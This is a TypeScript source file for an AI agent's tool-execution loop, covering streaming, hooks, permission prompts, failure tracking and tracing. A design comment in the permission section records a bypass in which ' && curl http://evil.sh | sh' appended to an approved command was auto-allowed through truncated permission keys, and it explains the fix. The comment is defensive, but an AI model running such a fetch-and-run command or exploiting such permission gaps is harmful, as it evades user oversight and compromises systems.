/**
 * Agent Loop 子系统 —— LLM 流式调用 + 工具执行循环。
 * 调用方：Runtime（runSingleTurn 中委托 run）
 * 服务于：单一 stream() 循环 —— 模型生成文本 + 结构化 tool_calls，
 *         执行工具 → 结果塞回 → 下一轮，直到无工具调用或达最大轮数
 *
 * 可靠性防护（思维链强化·阶段A）：
 *   - 重复失败保护：同一工具+同参数连续重复失败 → 提示追加进该工具结果（不新增消息，
 *     避免 Anthropic user/assistant 交替约束 400）
 *   - 轮数耗尽收尾：最后一轮前注入收尾提示（更新任务清单 + 总结回复），
 *     耗尽时优雅兜底（回溯最后 assistant 进展说明，不向用户抛工具原始输出）
 *   - maxTurns 可按次传入（Runtime 层：清单有未完成项时放大轮数预算）
 *   - 内层引导（steering）：工具跑完、下一次 LLM 调用**之前**取件（opts.takeSteer），
 *     追加进最后一条 tool 结果 —— 用户执行中途插入的指示进的是**本轮**上下文，
 *     而不是等整轮结束才另起一回合（那样就叫 followUp 了）。见 ④ 段。
 *
 * 依赖（core 接口 + 注入回调）：
 *   - llm（LLMProvider）流式生成
 *   - tools（ToolProvider）执行工具
 *   - permission（PermissionProvider）工具权限
 *   - events（EventBus）发射工具/流事件
 *   - 回调：onPermission（权限弹窗）、onDiagnostic（记录错误）、onFallback（LLM 失败切换）
 *
 * 可观测（骨架 span 的中层与内层都挂在本文件）：
 *   - llm_request 段：包住一次完整的 LLM 网络往返（含 TTFT、真实 usage、工具调用数）
 *   - tool_call   段：包住一次工具执行（权限弹窗的等人时间刻意排除在外）
 *   两段都走 events.trace()：配对由 try/finally 结构保证，抛异常也一定会关门。
 */
import type { LLMProvider, LLMMessage, LLMToolCall, ThinkingBlock, LLMUsage } from '../llm/types.js';
import type { ToolProvider } from '../core/tools.js';
import { toolStatusFails } from '../core/tools.js';
import type { PermissionProvider } from '../core/permission.js';
import type { EventBus, SpanRecorder } from '../core/events.js';
import { spanRecorderOf } from '../core/events.js';
import { decodeDeny } from './tool-hooks.js';
import type { SpanAttrs, SpanResult } from '../runtime/events.js';
import type { AgentLoopOptions, AgentLoopResult, AgentLoopService } from '../core/loop.js';

/** 默认最大轮数（防死循环） */
export const DEFAULT_MAX_TURNS = 5;
/** 带 TASK.md 计划的复杂任务的最大轮数（计划给了循环"地图"，允许更长推进） */
export const WITH_PLAN_MAX_TURNS = 15;

/** AgentLoop 依赖 */
export interface AgentLoopDeps {
  llm: LLMProvider;
  tools: ToolProvider;
  permission: PermissionProvider;
  events: EventBus;
  /** 权限确认回调（返回 'allow' | 'deny' | 'always'；默认 allow） */
  onPermission?: (toolName: string, detail: string) => Promise<'allow' | 'deny' | 'always'>;
  /** 诊断记录回调（LLM/工具失败时） */
  onDiagnostic?: (level: string, item: string, message: string) => void;
  /** LLM 失败兜底回调（返回 true 表示已切换可重试；默认 false） */
  onFallback?: (error: unknown) => Promise<boolean>;
}

/** 参数规范化：顶层 key 排序后序列化，防字段顺序抖动导致重复失败检测漏判 */
function normalizeArgs(rawArgs: string): string {
  try {
    const parsed = JSON.parse(rawArgs) as Record<string, unknown>;
    const sorted: Record<string, unknown> = {};
    for (const key of Object.keys(parsed).sort()) sorted[key] = parsed[key];
    return JSON.stringify(sorted);
  } catch {
    return rawArgs;
  }
}

/** Agent Loop 子系统实现 */
export class AgentLoopServiceImpl implements AgentLoopService {
  constructor(private deps: AgentLoopDeps) {}

  /**
   * 运行一轮 Agent Loop：LLM 生成 → 工具执行 → 循环。
   * @param toolMessages 初始消息（含 system 工具描述 + 历史 + 用户消息）
   * @param onToken 流式 token 回调（可选，透传给 UI）
   * @param opts 可选参数（maxTurns：本次循环最大轮数；thinking：本次 thinking 按次覆盖）
   */
  async run(
    toolMessages: LLMMessage[],
    onToken?: (chunk: string) => void,
    opts?: AgentLoopOptions,
  ): Promise<AgentLoopResult> {
    const { llm, tools, events } = this.deps;
    // 打卡能力：总线不具备时退化成空打卡器（下面的调用点不必判空，测试替身也能直接跑）
    const spans: SpanRecorder = spanRecorderOf(events);
    const toolDefs = tools.getLLMTools();
    const maxTurns = Math.max(1, opts?.maxTurns ?? DEFAULT_MAX_TURNS);
    let finalText = '';
    /**
     * 各轮真实用量合计 + 合计是否仍可信（分开两件事，避免把 null 当累加器用）。
     * 任一轮没拿到就永久置 false：少报的"真值"比估算值更误导
     * （消费端分不清"这就是全部"与"只是其中几轮"）。
     * 不可信时整体报 null，缺失只发生在流异常轮与不支持用量的端点，上层会回退估算。
     */
    const usageTotal: LLMUsage = { promptTokens: 0, completionTokens: 0, totalTokens: 0 };
    let usageComplete = true;

    // 重复失败追踪器：抓"同一工具+同参数连续重复失败"（换了调用或成功即中断）
    let repeatTracker: { key: string; count: number } | null = null;
    let finishedEarly = false;
    // 本轮起始下标：之后 push 进来的都是**本次循环生成**的消息（assistant+tool_calls / tool 结果），
    // 结束时切片上交 turnLog 供 Runtime 落盘（最终回复不入 toolMessages，天然不在此列）
    const startLen = toolMessages.length;

    for (let turn = 0; turn < maxTurns; turn++) {
      // ── ① LLM 流式生成 + 收集工具调用（整段包在 llm_request span 里） ──
      let turnText = '';
      const turnCalls: LLMToolCall[] = [];
      // 本轮 thinking 块收集（阶段 C3 问题3）：协议数据非展示内容，挂回 assistant 消息供下一轮回放（仅 Anthropic 路径产出）
      const turnThinking: ThinkingBlock[] = [];
      // 真实用量（API 未返回则为 null，区别于 0）—— 由 trace 回调返回而非在回调内赋值：
      // TS 的控制流不跟踪闭包内的赋值，写成回调内改外层 let 会被锁死成初始的 null
      let turnUsage: LLMUsage | null = null;
      // 首字时刻（TTFT 只能在收到第一个 token 的那一刻量，出了这个作用域永久丢失）
      let firstTokenAt: number | null = null;
      try {
        const reqAttrs: SpanAttrs<'llm_request'> = {
          turn,
          // 模型名由 Runtime 按次下发（而非构造时快照）：/model 与兜底切换都会改模型，
          // 快照会在热切换后永久陈旧，报出来的耗时归到错误的模型头上
          model: opts?.model ?? 'unknown',
          messageCount: toolMessages.length,
          toolCount: toolDefs.length,
          // thinking 只在按次覆盖时有真值（缺省跟 Provider 配置走，本层无从得知）
          ...(opts?.thinking !== undefined ? { thinking: opts.thinking } : {}),
        };
        turnUsage = await spans.trace('llm_request', reqAttrs, async (span): Promise<LLMUsage | null> => {
          // 本轮用量（回调内局部，随返回值交出）
          let usage: LLMUsage | null = null;
          const eventStream = llm.stream(toolMessages, toolDefs, {
            ...(opts?.thinking !== undefined ? { thinking: opts.thinking } : {}),
          });
          for await (const event of eventStream) {
            if (event.type === 'token') {
              if (firstTokenAt === null) firstTokenAt = Date.now();
              turnText += event.text;
              onToken?.(event.text);
              events.emit({ type: 'stream_text', text: event.text });
            } else if (event.type === 'reasoning') {
              // 思维链推理片段（阶段 C1）：只透传展示事件，不进 turnText/不走 onToken——
              // 保证 finalText、会话历史、兜底回溯拿到的都是正式答案（展示不持久）
              events.emit({ type: 'stream_reasoning', text: event.text });
            } else if (event.type === 'thinking_block') {
              // 完整 thinking 块（阶段 C3 问题3）：推理文本已由 reasoning 分片展示过，
              // 此处只收协议数据（含 signature），随本轮 assistant 消息挂回供下一轮原样回放（验章防篡改）
              turnThinking.push(event.block);
            } else if (event.type === 'tool_call') {
              turnCalls.push(...event.toolCalls);
            } else if (event.type === 'end') {
              turnText = event.fullText;
              usage = event.usage ?? null;
            }
          }
          // 出门载荷：这四个字段只有生产端知道，任何下游消费者都无法重建
          const done: SpanResult<'llm_request'> = {
            firstTokenMs: firstTokenAt === null ? null : firstTokenAt - span.startedAt,
            textLength: turnText.length,
            toolCallCount: turnCalls.length,
            usage,
          };
          // 空流（一个字、一个工具调用都没有）单独标记：它不是 error，但是异常信号
          if (!turnText && turnCalls.length === 0) done.status = 'empty';
          span.set(done);
          return usage;
        });
      } catch (err) {
        // 流异常 → 诊断 + 兜底切换（可重试则 continue）
        // 关门已由 trace() 在重抛前完成（status='error'），且耗时不含兜底弹窗的等人时间
        usageComplete = false;   // 这轮没有用量可言，合计不再可信
        console.error('[AgentLoop] LLM stream error:', err);
        this.deps.onDiagnostic?.('fail', 'llm', err instanceof Error ? err.message.split('\n')[0] : String(err));
        const switched = await this.deps.onFallback?.(err) ?? false;
        if (switched) continue;
        finalText = `❌ LLM 调用失败: ${err instanceof Error ? err.message : String(err)}`;
        finishedEarly = true;
        break;
      }

      // 本轮用量并入合计（turnUsage 为 null = API 没给，合计从此不可信）
      if (!turnUsage) {
        usageComplete = false;
      } else {
        usageTotal.promptTokens += turnUsage.promptTokens;
        usageTotal.completionTokens += turnUsage.completionTokens;
        usageTotal.totalTokens += turnUsage.totalTokens;
        // 缓存明细逐轮有报就累加；全程无报则字段保持缺省（不伪报 0）
        if (turnUsage.cacheReadTokens !== undefined) {
          usageTotal.cacheReadTokens = (usageTotal.cacheReadTokens ?? 0) + turnUsage.cacheReadTokens;
        }
        if (turnUsage.cacheCreationTokens !== undefined) {
          usageTotal.cacheCreationTokens = (usageTotal.cacheCreationTokens ?? 0) + turnUsage.cacheCreationTokens;
        }
      }

      // ── ② 无工具调用 → 最终答案 ──
      if (turnCalls.length === 0) {
        finalText = turnText;
        finishedEarly = true;
        break;
      }

      // ── ③ 执行工具，结果塞回 ──
      // 本轮产出的 thinking 块随消息挂回（条件展开：无块不传该键，兼容 exactOptionalPropertyTypes）
      toolMessages.push({
        role: 'assistant', content: turnText, tool_calls: turnCalls,
        ...(turnThinking.length > 0 ? { thinkingBlocks: turnThinking } : {}),
      });
      for (const tc of turnCalls) {
        let args: Record<string, unknown> = {};
        try {
          args = JSON.parse(tc.function.arguments) as Record<string, unknown>;
        } catch { args = {}; }
        events.emit({ type: 'tool_execution_start', name: tc.function.name, args });

        // ── 钩子闸（before_tool_call）：程序闸刻意放在权限弹窗（人闸）之前 ——
        // 钩子先拦掉明显违规的调用，人不该看到的弹窗就根本不弹。
        // 钩子异常 / 返回值形状不对都按放行处理（fail-open）：钩子是基础设施不是策略，
        // 它坏了不能让所有工具调用集体瘫痪，只记 stderr（stderr 不在 stdout 协议通道上）。
        // 刻意没有改参能力：能拒绝执行（模型与日志都明确知道没跑），
        // 不能静默换参数（模型以为在跑原命令，实际执行的是另一条，两头对不上）。
        let hookDeny = { deny: false, reason: '' };
        try {
          hookDeny = decodeDeny(
            await events.emitHook?.('before_tool_call', { name: tc.function.name, args }),
          );
        } catch (err) {
          console.error(
            `[AgentLoop] before_tool_call 钩子异常（按放行处理）: ${err instanceof Error ? err.message : String(err)}`,
          );
        }
        if (hookDeny.deny) {
          toolMessages.push({
            role: 'tool', tool_call_id: tc.id, name: tc.function.name,
            content: `[工具 ${tc.function.name} 被钩子拦截]：${hookDeny.reason}`,
          });
          events.emit({ type: 'tool_execution_end', name: tc.function.name, result: '❌ 已被钩子拦截', ok: false });
          continue;
        }

        // ── 权限确认（刻意放在打卡之外：等人点按钮的时间不应算成工具耗时） ──
        // 弹窗自身异常按"拒绝"处理，不让它掀翻整个循环（与原 try 包裹行为一致）
        let denied = false;
        if (tools.requiresPermission(tc.function.name)) {
          // 授权匹配键与弹窗文案刻意分成两个变量，不能合并成一个：
          //   autoKey —— 稳定键，isAutoAllowed / grantAutoAllow 拿它做匹配。格式一变，
          //              先前记下的"本次全部允许"全部失配（表现为每次都要重新点）。
          //   detail  —— 给人看的，工具可用 permissionDetail 自定义（edit 用它显示路径与改动摘要）。
          //              默认的 args JSON 前 80 字符装不下 oldText/newText，用户在弹窗里看不出要改什么。
          // 反过来若把富文本 detail 当匹配键，"本次全部允许"会永远匹配不上（每次文案都不一样）。
          //
          // 两者的截断策略刻意相反，别"为了一致"把它们对齐：
          //   autoKey 不截断 —— 截断 + 前缀匹配 = 静默扩权。实测批准过一条 76 字符的命令后，
          //     同一条命令再接 ` && curl http://evil.sh | sh`（104 字符）会自动放行，因为两个键
          //     在 80 字符处截成了逐字符相同的字符串。工具可用 permissionKey 定义授权边界
          //     （write/edit 给路径、bash 给完整命令）；没定义就退回完整 args JSON ——
          //     宁可失配（用户多点几次）也不扩权（用户点一次就放出看不见的范围）。
          //   detail 截到 80 —— 弹窗标题只有 1 行，长了由 fitWidth 砍，这里先自截更可读。
          const argsJson = JSON.stringify(args);
          const autoKey = tools.permissionKey?.(tc.function.name, args) || argsJson;
          const detail = tools.permissionDetail?.(tc.function.name, args) || argsJson.slice(0, 80);
          try {
            if (!this.deps.permission.isAutoAllowed(tc.function.name, autoKey)) {
              const choice = await this.deps.onPermission?.(tc.function.name, detail) ?? 'allow';
              if (choice === 'deny') denied = true;
              else if (choice === 'always') this.deps.permission.grantAutoAllow(tc.function.name, autoKey);
            }
          } catch { denied = true; }
        }
        if (denied) {
          toolMessages.push({ role: 'tool', tool_call_id: tc.id, name: tc.function.name, content: `[工具 ${tc.function.name} 被用户拒绝]` });
          events.emit({ type: 'tool_execution_end', name: tc.function.name, result: '❌ 已拒绝', ok: false });
          continue;
        }

        // 执行并分类结果（结构化返回值，2026-09-12 起）。分类不再解析前缀文本：
        // ToolResult.status 由生产方（工具/构造器）声明，这里只读字段——改前靠
        // startsWith 解析前缀，前缀拼错一个字母分类就静默漂移成"成功"，且新增状态两头改。
        // 判定式只有 toolStatusFails 一份（core/tools.ts），别处不许重抄。
        //
        // 三类语义（维持不变）：
        //   ① 硬失败 = 抛异常（下面 catch）或 status 为 error / verify_failed
        //   ② 无效输入 = invalid：工具**没能工作**，因为模型给的参数不合法（缺参/空值/坏正则/坏 glob）。
        //      计入失败，因为原样重试必然再错。改前不计，实测后果：grep 缺 pattern 连传三次，
        //      三次都只拿回干净的 [INVALID]，下面的 [系统提示] 一次也没注入 —— 模型能在同一个
        //      错参数上烧完全部轮次而收不到任何“你在重复犯错”的信号。
        //   ③ 有效否定 = negative（NOT_FOUND/NO_MATCH/NOT_FILE/NOT_DIR/EMPTY）：工具**正常工作**了，
        //      答案是“没有”。不计失败：那是有用信息而不是错误，连查三个不同的词都落空是合法探索。
        // 把③当②会让模型每查一个不存在的符号都被念一次；把②当③就是改前那个洞。verify-phase-ab 的 A4/A5 两头钉住
        let resultContent = '';
        let failed = false;
        const toolStartAt = Date.now(); // after_tool_call 钩子的耗时从执行段起算（不含等人点弹窗的时间）
        try {
          const callAttrs: SpanAttrs<'tool_call'> = { name: tc.function.name, args };
          await spans.trace('tool_call', callAttrs, async (span) => {
            const result = await tools.execute(tc.function.name, args);
            resultContent = result.content;
            failed = toolStatusFails(result.status);
            const done: SpanResult<'tool_call'> = { name: tc.function.name, resultLength: resultContent.length };
            // 工具层软失败（[ERROR] 前缀）不抛异常，只能在这里把它抬成 status
            if (failed) done.status = 'error';
            span.set(done);
          });
        } catch (err) {
          resultContent = `[工具 ${tc.function.name} 执行失败]\n${err}`;
          failed = true;
          this.deps.onDiagnostic?.('fail', 'tool', `工具 ${tc.function.name} 执行失败: ${err instanceof Error ? err.message : String(err)}`);
        }
        // 成与败两条路径都必须发 tool_execution_end：过去 catch 分支漏发，
        // 任何按 start/end 配对计数的消费者会永远认为该工具还在执行（UI 卡在下边框不画）
        events.emit({ type: 'tool_execution_end', name: tc.function.name, result: resultContent, ok: !failed });

        // ── 钩子（after_tool_call）：只在真正执行后发 —— 被钩子/权限拒绝的两条路径
        // 根本没有执行结果可看。只读观察：返回值刻意不消费（语义决策，见 DECISION_LOG）。
        try {
          await events.emitHook?.('after_tool_call', {
            name: tc.function.name, args, result: resultContent, ok: !failed,
            durationMs: Date.now() - toolStartAt,
          });
        } catch (err) {
          console.error(
            `[AgentLoop] after_tool_call 钩子异常: ${err instanceof Error ? err.message : String(err)}`,
          );
        }

        // ── 重复失败保护：同一调用连续重复失败 → 提示追加进该结果（仅建议不阻断） ──
        // 追加进 tool 结果而非新增消息：新增 user 消息在 Anthropic 转换后会与前一条（也是 user）连续，
        // 违反 user/assistant 交替约束直接 400；两种协议下 tool 结果 content 都是自由文本，协议安全
        const callKey = `${tc.function.name}|${normalizeArgs(tc.function.arguments)}`;
        if (failed) {
          repeatTracker = repeatTracker && repeatTracker.key === callKey
            ? { key: callKey, count: repeatTracker.count + 1 }
            : { key: callKey, count: 1 };
          if (repeatTracker.count === 2) {
            resultContent += `\n\n[系统提示] 相同调用 ${tc.function.name}(${JSON.stringify(args).slice(0, 120)}) 已连续失败 2 次。停止用相同参数重试：先阅读上方失败原因，用 read/ls 确认目标实际状态，再更换调用方式（不同参数、不同路径或换工具）后重试。`;
          } else if (repeatTracker.count >= 3) {
            resultContent += `\n\n[系统提示] 相同调用 ${tc.function.name} 已连续失败 ${repeatTracker.count} 次。放弃这条路径：向用户说明卡点并讨论替代方案，不要继续消耗轮次。`;
          }
        } else if (repeatTracker?.key === callKey) {
          repeatTracker = null; // 同一调用成功 → 问题已解决，清除追踪
        }

        toolMessages.push({ role: 'tool', tool_call_id: tc.id, name: tc.function.name, content: resultContent });
      }

      // ── ④ 内层引导（steering）：工具跑完、下一次 LLM 调用之前，是本轮唯一的注入窗口 ──
      //   为什么落在这里而不是外层循环：模型"跑偏"只有执行过一两个工具才看得出来，
      //   而用户此刻输入的话必须进**本轮**的上下文才算引导；等整轮跑完再处理就退化成 followUp。
      //   吸收方式沿用同一手法（重复失败提示 / 收尾提示）：追加进最后一条 tool 结果的 content。
      //   **不能**新开一条 user 消息 —— tool 结果在 anthropic.ts 里已转成 user 角色，
      //   再插一条 user 就是连续两条 user，违反交替约束直接 400（见 toAnthropicMessages）。
      //
      //   只在 turn < maxTurns - 1 时取件：最后一轮取走会无人消费（本轮之后没有 LLM 调用了），
      //   等于把用户的话吞掉 —— 既不进上下文、也不再回队。宁可留在队列里，让外层循环
      //   把它当成下一回合正常处理（用户至少能看到它被响应）。
      //
      //   落盘（2026-09-10 补）：取件到的引导由 Runtime 侧记入本轮缓冲，在本轮 assistant
      //   **之前**落盘为独立 user 条目（见 runtime.ts 的 runSingleTurn）—— 所以它既进本轮
      //   上下文，也进会话历史（/history 可见）。形状上会产出 user,user,assistant，由
      //   anthropic.ts 的**同角色相邻归并**消化；OpenAI 兼容路径原样透传，标准语义容忍。
      if (turn < maxTurns - 1) {
        const steer = opts?.takeSteer?.() ?? null;
        if (steer) {
          const lastMsg = toolMessages[toolMessages.length - 1];
          if (lastMsg && lastMsg.role === 'tool') {
            lastMsg.content += `\n\n[用户引导] 用户在你执行过程中插入了新指示，优先级高于当前步骤，必要时放弃当前方向：\n${steer}`;
          }
        }
      }

      // ⑤ 工具执行完 → 下一轮
      // 收尾提示：下一轮即最后一轮时，追加到最后一条工具结果，让模型收敛（协议安全，同上）
      if (turn === maxTurns - 2) {
        const lastMsg = toolMessages[toolMessages.length - 1];
        if (lastMsg && lastMsg.role === 'tool') {
          lastMsg.content += `\n\n[系统提示] 轮次即将耗尽，下一轮是最后一轮。停止开启新步骤：用 todo 如实更新清单（未完成项保持未完成、已完成项标 done），下一轮直接向用户返回总结（完成了什么、没完成什么、剩余什么），不要再调工具。`;
        }
      }
    }

    // ⑥ 循环结束后仍无回复 → 按退出原因分别兜底（不向用户抛工具原始输出）
    if (!finalText) {
      if (finishedEarly) {
        // 空流提前退出：流被异常中断（如余额不足/密钥无效，provider 层已记录真实错误）——不误报为轮数耗尽
        this.deps.onDiagnostic?.('warn', 'llm', 'LLM 返回空内容（流可能被异常中断）');
        finalText = '❌ 模型返回了空内容（流可能异常中断，常见原因：余额不足/密钥无效/网络故障）。真实错误已输出到终端与诊断，可用 /diagnostics 查看。';
      } else {
        // 真轮数耗尽：回溯最后 assistant 进展，结构化总结 + 断点续传指引
        const lastAssistant = [...toolMessages].reverse().find(
        (m) => m.role === 'assistant' && m.content && m.content.trim(),
      );
      const progress = lastAssistant?.content?.trim() || '（模型未留下进展说明）';
        finalText = `⚠️ 达到最大轮数（${maxTurns}），任务未完成。\n\n【目前进展】\n${progress}\n\n可以说"继续"，未完成的任务会从断点续传。`;
        this.deps.onDiagnostic?.('warn', 'loop', `Agent Loop 达到最大轮数 (${maxTurns}) 结束，任务未完成`);
      }
    }

    return { finalText, usage: usageComplete ? usageTotal : null, turnLog: toolMessages.slice(startLen) };
  }
}
